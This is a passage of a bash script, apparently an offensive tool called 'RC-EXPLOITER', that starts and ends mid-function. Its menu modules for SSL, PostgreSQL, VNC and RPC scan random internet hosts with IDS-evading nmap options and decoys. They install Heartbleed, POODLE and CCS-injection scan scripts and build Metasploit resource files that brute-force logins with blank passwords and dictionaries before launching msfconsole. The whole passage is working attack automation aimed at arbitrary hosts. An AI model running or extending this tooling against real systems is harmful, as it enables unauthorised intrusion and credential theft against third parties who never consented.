     nmap $IdS -T4 -iR $NUM -PN -n -p 443 --open --reason -oN $IPATH/logs/Random-Hosts[ssl].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 443\nLOGFILE: Random-Hosts[ssl].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[ssl].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg verbose true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[ssl].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/ssl.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[ssl].log > /dev/null 2>&1

         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp ssl.rc ssl.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" ssl.rc
         cd $IPATH


        # check if exists nmap scripts folder
        if [ -d $nSeS ]; then
            # copy nse scripts and lua lib to nmap directory
            echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Updating nse database.. ${Reset};
            sleep 1
            cp $IPATH/bin/ssl-poodle.nse $nSeS/ssl-poodle.nse
            cp $IPATH/bin/ssl-heartbleed.nse $nSeS/ssl-heartbleed.nse
            cp $IPATH/bin/ssl-ccs-injection.nse $nSeS/ssl-ccs-injection.nse
            cp $IPATH/bin/tls.lua $nSeLib/tls.lua

        else

          # error nse folder not found
          echo ${RedF}[x]☠ [ERROR][ NSE FOLDER NOT FOUND UNDER ] ${Reset};
          echo ${RedF}[x]☠ [PATH=][ $nSeS ] ${Reset};
          sleep 2
          # manually input NSE folders path and metasploit nmap path
         qU=$(zenity --title "☠ INPUT NSE SCRIPTS INSTALL PATH ☠" --text "example: /usr/share/nmap/scripts" --entry --width 350) > /dev/null 2>&1
          qU2=$(zenity --title "☠ INPUT NSE NSELIB INSTALL PATH ☠" --text "example: /usr/share/nmap/nselib" --entry --width 350) > /dev/null 2>&1
          echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Updating nse database.. ${Reset};
          # copy files to its rigth place in nmapdb and msfdb
          cp $IPATH/bin/ssl-poodle.nse $qU/ssl-poodle.nse
          cp $IPATH/bin/ssl-heartbleed.nse $qU/ssl-heartbleed.nse
          cp $IPATH/bin/ssl-ccs-injection.nse $qU/ssl-ccs-injection.nse
          cp $IPATH/bin/tls.lua $qU2/tls.lua
        fi

      # update NSE database befor running resource files
      nmap --script-updatedb > /dev/null 2>&1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ NSE db updated ...     [${GreenF}OK${white}] ${Reset};
      sleep 1

      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[ssl].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi


  # clean old files
  rm $IPATH/exploits/copy.int > /dev/null 2<&1
  mv $IPATH/exploits/ssl.bk $IPATH/exploits/ssl.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/ssl.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then

    # generate (settings) resource file
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
    sleep 1
    echo "hosts -d" > $IPATH/db/msfdb.rc
    echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg verbose true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[ssl].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

    echo "resource $IPATH/exploits/ssl.rc" >> $IPATH/db/msfdb.rc
    chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp ssl.rc ssl.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" ssl.rc
         cd $IPATH



        # check if exists nmap script folder
        if [ -d $nSeS ]; then
            # copy nse scripts and lua lib to nmap directory
            echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Updating nse database.. ${Reset};
            sleep 1
            cp $IPATH/bin/ssl-poodle.nse $nSeS/ssl-poodle.nse
            cp $IPATH/bin/ssl-heartbleed.nse $nSeS/ssl-heartbleed.nse
            cp $IPATH/bin/ssl-ccs-injection.nse $nSeS/ssl-ccs-injection.nse
            cp $IPATH/bin/tls.lua $nSeLib/tls.lua

        else

          echo ${RedF}[x]☠ [ERROR][ NSE FOLDER NOT FOUND UNDER ] ${Reset};
          echo ${RedF}[x]☠ [PATH=][ $nSeS ] ${Reset};
          sleep 2
         qU=$(zenity --title "☠ INPUT NSE SCRIPTS INSTALL PATH ☠" --text "example: /usr/share/nmap/scripts" --entry --width 350) > /dev/null 2>&1
          qU2=$(zenity --title "☠ INPUT NSE NSELIB INSTALL PATH ☠" --text "example: /usr/share/nmap/nselib" --entry --width 350) > /dev/null 2>&1
          echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Updating nse database.. ${Reset};
          cp $IPATH/bin/ssl-poodle.nse $qU/ssl-poodle.nse
          cp $IPATH/bin/ssl-heartbleed.nse $qU/ssl-heartbleed.nse
          cp $IPATH/bin/ssl-ccs-injection.nse $qU/ssl-ccs-injection.nse
          cp $IPATH/bin/tls.lua $qU2/tls.lua
        fi

      # update NSE database befor running resource files
      nmap --script-updatedb > /dev/null 2>&1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ NSE db updated ...     [${GreenF}OK${white}] ${Reset};
      sleep 1

      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[ssl].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  rm $IPATH/exploits/copy.int > /dev/null 2<&1
  mv $IPATH/exploits/ssl.bk $IPATH/exploits/ssl.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/ssl.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# --------------------
# postgresql exploiter
# --------------------
sh_14 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1


     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 1433,5432 --open --reason -oN $IPATH/logs/Random-Hosts[postgresql].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 1433,5432\nLOGFILE: Random-Hosts[postgresql].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 1433,5432 --open --reason -oN $IPATH/logs/Random-Hosts[postgresql].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 1433,5432\nLOGFILE: Random-Hosts[postgresql].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[postgresql].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[postgresql].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/postgresql.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[postgresql].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp postgresql.rc postgresql.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" postgresql.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[postgresql].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi


  # clean old files
  mv $IPATH/exploits/postgresql.bk $IPATH/exploits/postgresql.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/postgresql.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then


    # generate (settings) resource file
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
    sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[postgresql].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/postgresql.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp postgresql.rc postgresql.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" postgresql.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[postgresql].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi


  # clean old files
  mv $IPATH/exploits/postgresql.bk $IPATH/exploits/postgresql.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/postgresql.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# --------------
# VNC exploiter
# --------------
sh_15 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1


     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 5900 --open --reason -oN $IPATH/logs/Random-Hosts[VNC].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 5900\nLOGFILE: Random-Hosts[VNC].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 5900 --open --reason -oN $IPATH/logs/Random-Hosts[VNC].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 5900\nLOGFILE: Random-Hosts[VNC].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[VNC].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[vnc].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/vnc.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[VNC].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp vnc.rc vnc.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" vnc.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[vnc].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/vnc.bk $IPATH/exploits/vnc.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/vnc.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then


    # generate (settings) resource file
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
    sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[vnc].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/vnc.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp vnc.rc vnc.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" vnc.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[vnc].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/vnc.bk $IPATH/exploits/vnc.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/vnc.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}
















# --------------
# RPC exploiter
# --------------
sh_16 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/Default.txt") > /dev/null 2>&1


     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 135,389,1801,3790,55553 --open --reason -oN $IPATH/logs/Random-Hosts[RPC].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 1135,389,1801,3790,55553\nLOGFILE: Random-Hosts[RPC].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 135,389,1801,3790,55553 --open --reason -oN $IPATH/logs/Random-Hosts[RPC].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 135,389,1801,3790,55553\nLOGFILE: Random-Hosts[RPC].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[RPC].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[rpc].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/rpc.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[RPC].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp rpc.rc rpc.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" rpc.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[rpc].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/rpc.bk $IPATH/exploits/rpc.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/rpc.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
